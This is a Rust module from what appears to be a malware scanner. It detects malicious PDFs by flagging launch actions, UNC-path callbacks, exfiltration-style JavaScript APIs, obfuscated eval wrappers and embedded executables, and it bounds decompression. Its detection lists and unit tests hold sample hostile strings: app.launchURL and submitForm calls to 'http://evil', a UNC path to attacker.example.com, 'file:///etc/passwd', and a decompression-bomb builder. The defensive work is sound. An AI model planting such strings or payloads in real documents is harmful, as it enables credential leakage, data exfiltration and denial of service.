//! Layer: PDF action / JavaScript / structural analysis.
//!
//! Detects malicious PDFs by parsing the PDF object graph and flagging:
//!
//! - **Suspicious action types**: `/Launch` (execute), `/GoToE` with UNC paths
//!   (SMB callback / NTLM relay), `/GoToR` (remote PDF), `/URI` (network
//!   callback), `/SubmitForm` (form-data exfiltration), `/JavaScript`,
//!   `/RichMediaExecute`.
//! - **Suspicious JS APIs**: `app.launchURL`, `app.openDoc`, `SOAP.connect`,
//!   `SOAP.request`, `this.submitForm`, `this.getURL`, `XMLHttpRequest`,
//!   `WebSocket`, `fetch`, `new Image` (with remote src).
//! - **Obfuscation level 4 signature**: `eval(atob(...))` /
//!   `eval(unescape(...))` wrappers that hide API names from literal scanners.
//! - **Embedded executables** (`/EmbeddedFiles` containing `.exe`/`.dll`/
//!   `.bat`/`.js`/`.scr`/`.ps1`/`.vbs` / `application/x-msdownload`).
//! - **XFA forms with submit events** (XML-driven exec surface).
//! - **Image XObjects with remote URLs** (tracking / callback beacon).
//! - **PDF 2.0 associated files** with executable types.
//!
//! Calibrated against the canonical red-team corpus from
//! [jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)
//! (48 PDFs × 5 obfuscation levels = 240 samples). Detection floor
//! commitments are tracked in `tests/` alongside this module.
//!
//! Cost: parses up to `MAX_OBJECTS` PDF objects, decompresses up to
//! `MAX_STREAM_DECOMPRESSED` per content stream, scans up to
//! `MAX_JS_SCAN_BYTES` of JS text per object.

use crate::verdict::{Finding, Layer, Severity};
use lopdf::{Document, Object, ObjectId};
use std::collections::HashSet;

/// `%PDF-` magic at file start. Some PDFs have a few junk bytes before the
/// header so we tolerate the first 1 KiB.
fn looks_like_pdf(data: &[u8]) -> bool {
    let window = &data[..data.len().min(1024)];
    window.windows(5).any(|w| w == b"%PDF-")
}

/// Bounded parser cost.
const MAX_OBJECTS: usize = 8192;
const MAX_STREAM_DECOMPRESSED: usize = 8 * 1024 * 1024;
const MAX_JS_SCAN_BYTES: usize = 512 * 1024;

/// Raw (compressed) input ceiling for the *non-Flate* decompression path.
/// We only hand a stream to lopdf's unbounded `decompressed_content()` when
/// its raw input is this small, so even a high-ratio legacy filter (LZW) can
/// only ever materialise a bounded amount of memory. Streams above this with
/// a non-Flate / chained / predictor filter are scanned in raw form instead —
/// reduced detection on rare legacy encodings, but never an OOM.
const MAX_NONFLATE_RAW: usize = 64 * 1024;

/// Decompress a PDF stream's content with a hard output bound, defeating
/// decompression-bomb DoS (a tiny FlateDecode stream that inflates to
/// multi-GB). lopdf's `decompressed_content()` uses `read_to_end` with no
/// output cap on both its zlib and LZW paths, so we cannot call it blindly.
///
/// Strategy:
///   * Sole `FlateDecode` (the overwhelmingly common case) **without** a
///     `/DecodeParms` predictor → inflate ourselves through a `take()`-bounded
///     reader, mirroring the discipline the JAR layer already uses. A bomb
///     truncates at the cap instead of exhausting memory.
///   * Anything else (LZW, ASCII85/Hex, chained filters, or Flate+predictor)
///     → fall back to lopdf only when the raw input is `<= MAX_NONFLATE_RAW`,
///     so worst-case expansion stays bounded; otherwise scan the raw bytes.
///
/// The returned buffer is always `<= MAX_STREAM_DECOMPRESSED`.
fn bounded_decompressed(stream: &lopdf::Stream) -> Vec<u8> {
    use std::io::Read;

    let raw = stream.content.as_slice();

    // Fast path: sole FlateDecode with no DecodeParms predictor.
    if is_sole_flate_no_parms(&stream.dict) {
        // PDF FlateDecode is zlib-wrapped (RFC 1950). A few malformed
        // producers emit raw deflate, so fall back to that on zlib failure.
        // `.take(cap + 1)` caps the materialised output regardless of the
        // declared/actual decompressed size — the bomb cannot exceed it.
        let cap = MAX_STREAM_DECOMPRESSED as u64;
        let mut out = Vec::new();
        if flate2::read::ZlibDecoder::new(raw)
            .take(cap + 1)
            .read_to_end(&mut out)
            .is_ok()
            || !out.is_empty()
        {
            out.truncate(MAX_STREAM_DECOMPRESSED);
            return out;
        }
        let mut raw_out = Vec::new();
        let _ = flate2::read::DeflateDecoder::new(raw)
            .take(cap + 1)
            .read_to_end(&mut raw_out);
        raw_out.truncate(MAX_STREAM_DECOMPRESSED);
        return raw_out;
    }

    // Non-Flate / chained / predictor path: only let lopdf's unbounded
    // decompressor run when the raw input is itself small enough that any
    // plausible expansion is bounded.
    if raw.len() <= MAX_NONFLATE_RAW {
        if let Ok(mut plain) = stream.decompressed_content() {
            plain.truncate(MAX_STREAM_DECOMPRESSED);
            return plain;
        }
    }

    // Last resort: scan the raw (compressed) bytes, bounded. ASCII-family
    // filters are already readable here; binary filters lose detection but
    // never bomb.
    let n = raw.len().min(MAX_STREAM_DECOMPRESSED);
    raw[..n].to_vec()
}

/// True when the stream's `/Filter` is exactly `FlateDecode` (or the `Fl`
/// abbreviation) with no `/DecodeParms` — the case our manual bounded
/// inflate reproduces faithfully for JS-string scanning.
fn is_sole_flate_no_parms(dict: &lopdf::Dictionary) -> bool {
    if dict.get(b"DecodeParms").is_ok() || dict.get(b"DP").is_ok() {
        return false;
    }
    let Ok(filter) = dict.get(b"Filter") else {
        return false;
    };
    match filter {
        Object::Name(n) => n.as_slice() == b"FlateDecode" || n.as_slice() == b"Fl",
        Object::Array(items) => {
            items.len() == 1
                && matches!(
                    items.first().and_then(|o| o.as_name().ok()),
                    Some(n) if n == b"FlateDecode" || n == b"Fl"
                )
        }
        _ => false,
    }
}

/// Analyze a PDF for malicious action / JavaScript / embedded-file content.
///
/// Returns empty findings on non-PDF input. Caller does not need to gate
/// by extension — the layer routes itself via the `%PDF-` header check.
pub fn analyze(_path: &str, data: &[u8]) -> Vec<Finding> {
    let mut findings = Vec::new();

    if !looks_like_pdf(data) {
        return findings;
    }

    // Parsing PDFs is liberal — malformed PDFs are extremely common. Treat
    // any parse error as "couldn't analyze" and bail empty rather than
    // synthesizing a finding (the malicious file may still be caught by
    // ClamAV / YARA / patterns layers).
    let doc = match Document::load_mem(data) {
        Ok(d) => d,
        Err(_) => return findings,
    };

    if doc.objects.len() > MAX_OBJECTS {
        findings.push(Finding {
            layer: Layer::StructuralAnalysis,
            severity: Severity::Low,
            weight: 3,
            description: format!(
                "PDF declares {} objects — unusually large structure.",
                doc.objects.len()
            ),
            technical_detail: None,
        });
    }

    let mut hit = PdfHits::default();
    let mut visited: HashSet<ObjectId> = HashSet::new();

    // 1. Walk the catalog: /OpenAction, /AA (additional actions), name trees
    //    for /EmbeddedFiles, /AcroForm for XFA. `doc.catalog()` returns the
    //    catalog dictionary directly — call `scan_dict` rather than wrapping.
    if let Ok(catalog) = doc.catalog() {
        scan_dict(catalog, &doc, &mut hit, &mut visited, 0);
        check_catalog_features(catalog, &doc, &mut hit, &mut visited);
    }

    // 2. Walk every page's annotations (/AA action-trigger annotations like
    //    `/PV` on-page-view fire as soon as the page is rendered — common in
    //    malicious-pdf samples that auto-trigger on open).
    if let Ok(pages) = doc.get_pages().into_iter().try_fold(
        Vec::new(),
        |mut acc, (_idx, page_id)| -> Result<Vec<ObjectId>, ()> {
            acc.push(page_id);
            Ok(acc)
        },
    ) {
        for page_id in pages.iter().take(MAX_OBJECTS) {
            if let Ok(page) = doc.get_object(*page_id) {
                if let Ok(page_dict) = page.as_dict() {
                    if let Ok(annots) = page_dict.get(b"Annots") {
                        scan_object(annots, &doc, &mut hit, &mut visited, 1);
                    }
                }
            }
        }
    }

    // 3. Sweep over every object once for any patterns we may have missed
    //    via the catalog/annotation walk (some malicious PDFs put actions
    //    in unreferenced objects that get reached via name dictionaries).
    for (id, obj) in doc.objects.iter().take(MAX_OBJECTS) {
        if visited.contains(id) {
            continue;
        }
        scan_object(obj, &doc, &mut hit, &mut visited, 0);
    }

    // ── Findings ───────────────────────────────────────────────────

    // Layer-routing rationale:
    //
    // **PDF JavaScript findings** route to `Layer::ScriptAnalysis` (cap 40)
    // because they ARE script — they're exactly the pattern that layer is
    // designed for, just embedded inside a PDF container instead of a .js /
    // .ps1 file. Sharing the script budget keeps a many-API JS payload from
    // double-counting with the standalone-script path.
    //
    // **PDF action-type findings** (Launch, GoToE+UNC, suspicious URI)
    // route to `Layer::PatternDetection` (cap 25) — these are
    // family-agnostic action-abuse patterns.
    //
    // **PDF structural facts** (auto-action on open, embedded executable,
    // XFA, remote image XObject, large object count) route to
    // `Layer::StructuralAnalysis` (cap 30).

    // ── Pattern-class (action-type abuse, cap 25 shared) ──

    if hit.launch_action {
        findings.push(Finding {
            layer: Layer::PatternDetection,
            severity: Severity::Critical,
            weight: 20,
            description: "PDF contains a /Launch action — opens an external program when the document is opened. Disabled by default in modern viewers but still abused by social-engineering campaigns.".into(),
            technical_detail: Some("Action dictionary with /S /Launch".into()),
        });
    }

    if hit.gotoe_unc {
        findings.push(Finding {
            layer: Layer::PatternDetection,
            severity: Severity::Critical,
            weight: 20,
            description: "PDF uses /GoToE with a UNC path (\\\\server\\share) — triggers SMB authentication to the attacker's server, leaking the user's NTLM hash for offline cracking or relay attacks.".into(),
            technical_detail: Some("/GoToE with /F containing UNC path".into()),
        });
    }

    if hit.uri_action_remote {
        findings.push(Finding {
            layer: Layer::PatternDetection,
            severity: Severity::Medium,
            weight: 6,
            description: "PDF /URI action targets a non-HTTPS URL, a raw IP literal, or a non-standard scheme — atypical for legitimate PDFs.".into(),
            technical_detail: Some("URI scheme: ftp/file/data, or IP-literal host".into()),
        });
    }

    // ── Script-class (JS in PDF, cap 40 shared) ──

    if hit.js_obfuscation_wrapper {
        findings.push(Finding {
            layer: Layer::ScriptAnalysis,
            severity: Severity::Critical,
            weight: 25,
            description: "PDF JavaScript wraps its payload in eval(atob(...)) or eval(unescape(...)) — defeats literal-string scanners. Matches malicious-pdf obfuscation level 4.".into(),
            technical_detail: Some("JS contains eval(atob(...)) or eval(unescape(...)) pattern".into()),
        });
    }

    if hit.js_app_launch {
        findings.push(Finding {
            layer: Layer::ScriptAnalysis,
            severity: Severity::High,
            weight: 18,
            description: "PDF JavaScript invokes app.launchURL or app.openDoc — opens external URLs or files as a callback channel.".into(),
            technical_detail: Some("JS APIs: app.launchURL / app.openDoc".into()),
        });
    }

    if hit.js_network_callback {
        findings.push(Finding {
            layer: Layer::ScriptAnalysis,
            severity: Severity::High,
            weight: 15,
            description: "PDF JavaScript opens network connections (SOAP.connect / XMLHttpRequest / WebSocket / fetch / new Image).".into(),
            technical_detail: Some(
                "JS APIs: SOAP.connect / SOAP.request / XMLHttpRequest / WebSocket / fetch / new Image".into(),
            ),
        });
    }

    if hit.js_submit_form {
        findings.push(Finding {
            layer: Layer::ScriptAnalysis,
            severity: Severity::High,
            weight: 15,
            description: "PDF JavaScript calls submitForm / this.submitForm — used by malicious PDFs to exfiltrate form data to attacker-controlled URLs.".into(),
            technical_detail: Some("JS APIs: this.submitForm / submitForm".into()),
        });
    }

    // ── Structural-class (PDF structure facts, cap 30 shared) ──

    if hit.embedded_executable {
        findings.push(Finding {
            layer: Layer::StructuralAnalysis,
            severity: Severity::High,
            weight: 18,
            description: "PDF embeds an executable file (.exe / .dll / .bat / .ps1 / .vbs / .scr / .js or application/x-msdownload) — the document is being used as a dropper container.".into(),
            technical_detail: Some("/EmbeddedFiles or /AF entry with executable type".into()),
        });
    }

    if hit.xfa_submit {
        findings.push(Finding {
            layer: Layer::StructuralAnalysis,
            severity: Severity::Medium,
            weight: 10,
            description: "PDF uses XFA forms with submit events — XML-driven action surface.".into(),
            technical_detail: Some("/AcroForm /XFA with submit event".into()),
        });
    }

    if hit.auto_action_on_open {
        findings.push(Finding {
            layer: Layer::StructuralAnalysis,
            severity: Severity::Medium,
            weight: 8,
            description: "PDF declares an action that fires automatically on open (/OpenAction or annotation /AA /PV) — combined with the other signals, this is the auto-trigger surface malicious-pdf abuses.".into(),
            technical_detail: Some("/OpenAction at catalog or /AA /PV on annotation".into()),
        });
    }

    if hit.remote_image_xobject {
        findings.push(Finding {
            layer: Layer::StructuralAnalysis,
            severity: Severity::Low,
            weight: 4,
            description: "PDF references remote image XObject — can be used as a tracking beacon or unintended callback channel.".into(),
            technical_detail: None,
        });
    }

    findings
}

/// Aggregated flags. We set them once and never clear so even
/// many-finding samples don't double-count.
#[derive(Default)]
struct PdfHits {
    launch_action: bool,
    gotoe_unc: bool,
    auto_action_on_open: bool,
    js_obfuscation_wrapper: bool,
    js_app_launch: bool,
    js_network_callback: bool,
    js_submit_form: bool,
    uri_action_remote: bool,
    embedded_executable: bool,
    xfa_submit: bool,
    remote_image_xobject: bool,
}

/// Recursively walk an object, looking for action dictionaries, JS streams,
/// and URIs. Bounded by `MAX_OBJECTS` total visits + a depth cap to avoid
/// pathological reference cycles.
fn scan_object(
    obj: &Object,
    doc: &Document,
    hit: &mut PdfHits,
    visited: &mut HashSet<ObjectId>,
    depth: u32,
) {
    if depth > 12 {
        return;
    }
    if visited.len() >= MAX_OBJECTS {
        return;
    }

    match obj {
        Object::Reference(id) => {
            if visited.contains(id) {
                return;
            }
            visited.insert(*id);
            if let Ok(target) = doc.get_object(*id) {
                scan_object(target, doc, hit, visited, depth + 1);
            }
        }
        Object::Array(items) => {
            for item in items {
                scan_object(item, doc, hit, visited, depth + 1);
            }
        }
        Object::Dictionary(dict) => {
            scan_dict(dict, doc, hit, visited, depth);
        }
        Object::Stream(stream) => {
            // Walk the stream's dictionary for action/JS markers, then peek
            // into the (possibly-compressed) content for JS strings.
            scan_dict(&stream.dict, doc, hit, visited, depth);

            // Decompress with a hard output bound (defeats decompression
            // bombs — see `bounded_decompressed`). Always returns at most
            // MAX_STREAM_DECOMPRESSED bytes.
            let plain = bounded_decompressed(stream);
            scan_js_content(&plain, hit);
        }
        _ => {}
    }
}

fn scan_dict(
    dict: &lopdf::Dictionary,
    doc: &Document,
    hit: &mut PdfHits,
    visited: &mut HashSet<ObjectId>,
    depth: u32,
) {
    // Action type — /S /Launch, /Submit*, /GoToE, /URI, /JavaScript, ...
    if let Ok(s) = dict.get(b"S") {
        if let Ok(name) = s.as_name() {
            match name {
                b"Launch" => hit.launch_action = true,
                b"GoToE" => {
                    if let Ok(f) = dict.get(b"F") {
                        if uri_or_file_looks_unc(f, doc) {
                            hit.gotoe_unc = true;
                        }
                    }
                }
                b"URI" => {
                    if let Ok(uri) = dict.get(b"URI") {
                        if uri_is_suspicious(uri, doc) {
                            hit.uri_action_remote = true;
                        }
                    }
                }
                b"SubmitForm" => hit.js_submit_form = true,
                b"RichMediaExecute" => hit.launch_action = true,
                _ => {}
            }
        }
    }

    // OpenAction at catalog OR /AA action trigger on page/annot.
    if dict.has(b"OpenAction") || dict.has(b"AA") {
        hit.auto_action_on_open = true;
        if let Ok(oa) = dict.get(b"OpenAction") {
            scan_object(oa, doc, hit, visited, depth + 1);
        }
        if let Ok(aa) = dict.get(b"AA") {
            scan_object(aa, doc, hit, visited, depth + 1);
        }
    }

    // /JS or /JavaScript entry — content scanned in the stream branch.
    if let Ok(js) = dict.get(b"JS") {
        scan_object(js, doc, hit, visited, depth + 1);
    }
    if let Ok(js) = dict.get(b"JavaScript") {
        scan_object(js, doc, hit, visited, depth + 1);
    }

    // Embedded files — name tree under catalog /Names /EmbeddedFiles,
    // OR /AF associated files (PDF 2.0).
    if let Ok(names) = dict.get(b"Names") {
        if let Ok(names_dict) = names.as_dict() {
            if let Ok(emb) = names_dict.get(b"EmbeddedFiles") {
                check_embedded_files(emb, doc, hit);
            }
        }
    }
    if let Ok(af) = dict.get(b"AF") {
        check_embedded_files(af, doc, hit);
    }

    // XFA forms (/AcroForm /XFA).
    if let Ok(form) = dict.get(b"AcroForm") {
        if let Ok(form_dict) = resolve_dict(form, doc) {
            if form_dict.has(b"XFA") {
                // Crude check — we don't fully parse XFA XML. Flag XFA
                // presence and the JS scan will catch event/submit handlers.
                // Real XFA-submit needs a content sniff.
                if let Ok(xfa) = form_dict.get(b"XFA") {
                    if xfa_content_has_submit(xfa, doc) {
                        hit.xfa_submit = true;
                    }
                }
            }
        }
    }

    // Image XObject with remote /URL (extension or annotation).
    if let Ok(subtype) = dict.get(b"Subtype") {
        if matches!(subtype.as_name(), Ok(b"Image")) && dict.has(b"URL") {
            hit.remote_image_xobject = true;
        }
    }
}

fn uri_or_file_looks_unc(obj: &Object, doc: &Document) -> bool {
    // Strings may live behind references.
    if let Object::Reference(id) = obj {
        if let Ok(target) = doc.get_object(*id) {
            return uri_or_file_looks_unc(target, doc);
        }
    }
    if let Ok(s) = obj.as_str() {
        let lossy = String::from_utf8_lossy(s);
        return lossy.starts_with("\\\\") || lossy.starts_with("//");
    }
    if let Ok(d) = obj.as_dict() {
        if let Ok(f) = d.get(b"F") {
            return uri_or_file_looks_unc(f, doc);
        }
    }
    false
}

fn uri_is_suspicious(obj: &Object, doc: &Document) -> bool {
    if let Object::Reference(id) = obj {
        if let Ok(target) = doc.get_object(*id) {
            return uri_is_suspicious(target, doc);
        }
    }
    if let Ok(s) = obj.as_str() {
        let lossy = String::from_utf8_lossy(s);
        let lower = lossy.to_ascii_lowercase();

        // Non-HTTPS scheme.
        if lower.starts_with("ftp://")
            || lower.starts_with("file://")
            || lower.starts_with("data:")
            || lower.starts_with("javascript:")
        {
            return true;
        }
        // IP literal host (rough heuristic — first dotted segment is digits).
        if let Some(rest) = lower.strip_prefix("http://").or_else(|| lower.strip_prefix("https://")) {
            let host = rest.split('/').next().unwrap_or("");
            let host_first = host.split('.').next().unwrap_or("");
            if !host_first.is_empty() && host_first.chars().all(|c| c.is_ascii_digit()) {
                return true;
            }
        }
    }
    false
}

fn xfa_content_has_submit(obj: &Object, doc: &Document) -> bool {
    // /XFA can be either an array of (name, stream-ref) pairs or a single stream.
    match obj {
        Object::Reference(id) => doc
            .get_object(*id)
            .map(|o| xfa_content_has_submit(o, doc))
            .unwrap_or(false),
        Object::Array(items) => items.iter().any(|it| xfa_content_has_submit(it, doc)),
        Object::Stream(s) => {
            // Bounded decompression — same bomb-safe path as the JS scan.
            let scan = bounded_decompressed(s);
            // Look for XFA submission event markers.
            contains_bytes(&scan, b"event activity=\"submit")
                || contains_bytes(&scan, b"<submit")
                || contains_bytes(&scan, b"action=\"submit")
        }
        _ => false,
    }
}

fn check_embedded_files(obj: &Object, doc: &Document, hit: &mut PdfHits) {
    fn walk(obj: &Object, doc: &Document, hit: &mut PdfHits, depth: u32) {
        if depth > 8 {
            return;
        }
        match obj {
            Object::Reference(id) => {
                if let Ok(t) = doc.get_object(*id) {
                    walk(t, doc, hit, depth + 1);
                }
            }
            Object::Array(items) => {
                for it in items {
                    walk(it, doc, hit, depth + 1);
                }
            }
            Object::Dictionary(d) => {
                if let Ok(f) = d.get(b"F") {
                    if let Ok(s) = f.as_str() {
                        let lossy = String::from_utf8_lossy(s).to_ascii_lowercase();
                        if EXEC_EXTS.iter().any(|e| lossy.ends_with(e)) {
                            hit.embedded_executable = true;
                        }
                    }
                }
                if let Ok(subtype) = d.get(b"Subtype") {
                    if matches!(subtype.as_name(), Ok(b"application/x-msdownload") | Ok(b"application/octet-stream")) {
                        hit.embedded_executable = true;
                    }
                }
                if let Ok(names) = d.get(b"Names") {
                    walk(names, doc, hit, depth + 1);
                }
                if let Ok(kids) = d.get(b"Kids") {
                    walk(kids, doc, hit, depth + 1);
                }
                if let Ok(ef) = d.get(b"EF") {
                    walk(ef, doc, hit, depth + 1);
                }
            }
            _ => {}
        }
    }
    walk(obj, doc, hit, 0);
}

const EXEC_EXTS: &[&str] = &[
    ".exe", ".dll", ".bat", ".cmd", ".scr", ".ps1", ".vbs", ".vbe", ".js",
    ".jse", ".jar", ".msi", ".hta", ".cpl", ".lnk", ".pif",
];

fn check_catalog_features(
    catalog: &lopdf::Dictionary,
    doc: &Document,
    hit: &mut PdfHits,
    visited: &mut HashSet<ObjectId>,
) {
    // Catalog-level /OpenAction is the headline auto-trigger surface for
    // malicious-pdf samples. Walk it explicitly so we don't miss it.
    if let Ok(oa) = catalog.get(b"OpenAction") {
        hit.auto_action_on_open = true;
        scan_object(oa, doc, hit, visited, 0);
    }
}

/// Resolve to a dictionary, following one level of reference if needed.
fn resolve_dict<'a>(obj: &'a Object, doc: &'a Document) -> Result<&'a lopdf::Dictionary, ()> {
    match obj {
        Object::Dictionary(d) => Ok(d),
        Object::Reference(id) => doc
            .get_object(*id)
            .ok()
            .and_then(|o| o.as_dict().ok())
            .ok_or(()),
        _ => Err(()),
    }
}

/// Scan decompressed stream / JS source for suspicious JavaScript APIs.
fn scan_js_content(content: &[u8], hit: &mut PdfHits) {
    let limit = content.len().min(MAX_JS_SCAN_BYTES);
    let scan = &content[..limit];

    // Obfuscation level 4 wrapper (defeats literal-string detection).
    if !hit.js_obfuscation_wrapper
        && (contains_bytes(scan, b"eval(atob(")
            || contains_bytes(scan, b"eval(unescape(")
            || contains_bytes(scan, b"Function(atob("))
    {
        hit.js_obfuscation_wrapper = true;
    }

    const APP_LAUNCH: &[&[u8]] = &[b"app.launchURL", b"app.openDoc"];
    if !hit.js_app_launch && APP_LAUNCH.iter().any(|p| contains_bytes(scan, p)) {
        hit.js_app_launch = true;
    }

    const NET_CALLBACK: &[&[u8]] = &[
        b"SOAP.connect",
        b"SOAP.request",
        b"XMLHttpRequest",
        b"WebSocket",
        b"fetch(",
        b"new Image",
    ];
    if !hit.js_network_callback && NET_CALLBACK.iter().any(|p| contains_bytes(scan, p)) {
        hit.js_network_callback = true;
    }

    const SUBMIT: &[&[u8]] = &[b"this.submitForm", b".submitForm(", b"submitForm("];
    if !hit.js_submit_form && SUBMIT.iter().any(|p| contains_bytes(scan, p)) {
        hit.js_submit_form = true;
    }
}

fn contains_bytes(hay: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > hay.len() {
        return false;
    }
    hay.windows(needle.len()).any(|w| w == needle)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn looks_like_pdf_detects_header() {
        assert!(looks_like_pdf(b"%PDF-1.7\n..."));
        // Some PDFs have a few bytes of junk before the header — tolerate it.
        let mut buf = vec![0u8; 100];
        buf.extend_from_slice(b"%PDF-1.4");
        assert!(looks_like_pdf(&buf));

        assert!(!looks_like_pdf(b"MZ\x00\x00"));
        assert!(!looks_like_pdf(b""));
        assert!(!looks_like_pdf(b"PK\x03\x04"));
    }

    #[test]
    fn analyze_non_pdf_returns_empty() {
        assert!(analyze("x.exe", b"MZ\x00\x00").is_empty());
        assert!(analyze("x.pdf", b"").is_empty());
        assert!(analyze("x.pdf", b"not a pdf").is_empty());
    }

    #[test]
    fn contains_bytes_edges() {
        assert!(!contains_bytes(b"abc", b""));
        assert!(!contains_bytes(b"abc", b"abcd"));
        assert!(contains_bytes(b"abc", b"abc"));
        assert!(contains_bytes(b"xxxneedle", b"needle"));
    }

    #[test]
    fn js_content_picks_up_obfuscation_wrapper() {
        let mut hit = PdfHits::default();
        scan_js_content(b"foo eval(atob('aGVsbG8=')) bar", &mut hit);
        assert!(hit.js_obfuscation_wrapper);
    }

    #[test]
    fn js_content_picks_up_app_launch() {
        let mut hit = PdfHits::default();
        scan_js_content(b"app.launchURL('http://evil');", &mut hit);
        assert!(hit.js_app_launch);
    }

    #[test]
    fn js_content_picks_up_network_callback() {
        let mut hit = PdfHits::default();
        scan_js_content(b"new XMLHttpRequest()", &mut hit);
        assert!(hit.js_network_callback);

        let mut hit2 = PdfHits::default();
        scan_js_content(b"SOAP.connect('http://x')", &mut hit2);
        assert!(hit2.js_network_callback);
    }

    #[test]
    fn js_content_picks_up_submit_form() {
        let mut hit = PdfHits::default();
        scan_js_content(b"this.submitForm({cURL: 'http://evil'})", &mut hit);
        assert!(hit.js_submit_form);
    }

    #[test]
    fn uri_suspicious_classifier() {
        // Helper: wrap the string in an Object::String for the test.
        fn lit(s: &str) -> Object {
            Object::String(s.as_bytes().to_vec(), lopdf::StringFormat::Literal)
        }
        // We don't have a real Document for the suspicious_uri path, but the
        // non-reference branch doesn't need one — verify just that branch.
        let doc = Document::with_version("1.7");
        assert!(uri_is_suspicious(&lit("javascript:alert(1)"), &doc));
        assert!(uri_is_suspicious(&lit("ftp://10.0.0.1/x"), &doc));
        assert!(uri_is_suspicious(&lit("http://192.168.1.1/c2"), &doc));
        assert!(uri_is_suspicious(&lit("file:///etc/passwd"), &doc));
        assert!(uri_is_suspicious(&lit("data:text/html,<script>"), &doc));
        // Legitimate HTTPS to a hostname — not flagged.
        assert!(!uri_is_suspicious(&lit("https://example.com/docs"), &doc));
    }

    #[test]
    fn unc_classifier() {
        fn lit(s: &str) -> Object {
            Object::String(s.as_bytes().to_vec(), lopdf::StringFormat::Literal)
        }
        let doc = Document::with_version("1.7");
        assert!(uri_or_file_looks_unc(&lit("\\\\attacker.example.com\\share\\foo.pdf"), &doc));
        assert!(uri_or_file_looks_unc(&lit("//attacker.example.com/share/foo.pdf"), &doc));
        assert!(!uri_or_file_looks_unc(&lit("local-file.pdf"), &doc));
        assert!(!uri_or_file_looks_unc(&lit("https://example.com"), &doc));
    }

    /// Build a FlateDecode stream whose decompressed size is `plain_len`
    /// but whose compressed payload is tiny — a decompression bomb.
    fn flate_bomb_stream(plain_len: usize) -> lopdf::Stream {
        use std::io::Write;
        let plain = vec![0u8; plain_len];
        let mut enc =
            flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::best());
        enc.write_all(&plain).unwrap();
        let compressed = enc.finish().unwrap();
        let mut dict = lopdf::Dictionary::new();
        dict.set("Filter", Object::Name(b"FlateDecode".to_vec()));
        lopdf::Stream::new(dict, compressed)
    }

    #[test]
    fn decompression_bomb_output_is_bounded() {
        // 64 MiB of zeros compresses to a few KB but would inflate to 64 MiB
        // (a real bomb is far worse — gigabytes). bounded_decompressed must
        // cap the materialised output at MAX_STREAM_DECOMPRESSED regardless,
        // and must do so without first allocating the full 64 MiB.
        let stream = flate_bomb_stream(64 * 1024 * 1024);
        assert!(
            stream.content.len() < 256 * 1024,
            "bomb payload should be tiny, got {} bytes",
            stream.content.len()
        );

        let out = bounded_decompressed(&stream);
        assert!(
            out.len() <= MAX_STREAM_DECOMPRESSED,
            "output must be capped at {MAX_STREAM_DECOMPRESSED}, got {}",
            out.len()
        );
        // It should actually reach the cap (proving it decompressed, just
        // bounded) rather than bailing to a near-empty raw scan.
        assert_eq!(out.len(), MAX_STREAM_DECOMPRESSED);
    }

    #[test]
    fn analyze_on_bomb_pdf_returns_promptly_and_bounded() {
        // Embed the bomb stream in a minimal valid PDF and run the full
        // analyze() path. Pre-fix this OOMed; now it must return with a
        // bounded allocation. We assert it simply completes (no panic / no
        // hang / no OOM) — the bomb stream carries no malicious markers, so
        // findings may be empty; correctness here is "it returns at all".
        let mut doc = Document::with_version("1.7");
        let bomb = flate_bomb_stream(64 * 1024 * 1024);
        let bomb_id = doc.add_object(Object::Stream(bomb));

        let mut catalog = lopdf::Dictionary::new();
        catalog.set("Type", Object::Name(b"Catalog".to_vec()));
        // Reference the bomb so the object walker reaches its Stream branch.
        catalog.set("OpenAction", Object::Reference(bomb_id));
        let catalog_id = doc.add_object(Object::Dictionary(catalog));
        doc.trailer.set("Root", Object::Reference(catalog_id));

        let mut buf = Vec::new();
        doc.save_to(&mut buf).expect("serialize bomb pdf");

        // Must return — the assertion is non-panic / non-hang. A bounded
        // scan completes in well under a second; a regression to unbounded
        // decompression would OOM or stall here.
        let _findings = analyze("bomb.pdf", &buf);
    }

    #[test]
    fn is_sole_flate_no_parms_classifier() {
        // Sole FlateDecode, no parms → fast path.
        let mut d = lopdf::Dictionary::new();
        d.set("Filter", Object::Name(b"FlateDecode".to_vec()));
        assert!(is_sole_flate_no_parms(&d));

        // FlateDecode WITH a predictor → not the fast path (lopdf applies
        // the predictor; our manual inflate would diverge).
        let mut dp = lopdf::Dictionary::new();
        dp.set("Filter", Object::Name(b"FlateDecode".to_vec()));
        let mut parms = lopdf::Dictionary::new();
        parms.set("Predictor", Object::Integer(12));
        dp.set("DecodeParms", Object::Dictionary(parms));
        assert!(!is_sole_flate_no_parms(&dp));

        // Chained filters → not the fast path.
        let mut dc = lopdf::Dictionary::new();
        dc.set(
            "Filter",
            Object::Array(vec![
                Object::Name(b"ASCII85Decode".to_vec()),
                Object::Name(b"FlateDecode".to_vec()),
            ]),
        );
        assert!(!is_sole_flate_no_parms(&dc));

        // LZW → not the fast path.
        let mut dl = lopdf::Dictionary::new();
        dl.set("Filter", Object::Name(b"LZWDecode".to_vec()));
        assert!(!is_sole_flate_no_parms(&dl));
    }
}
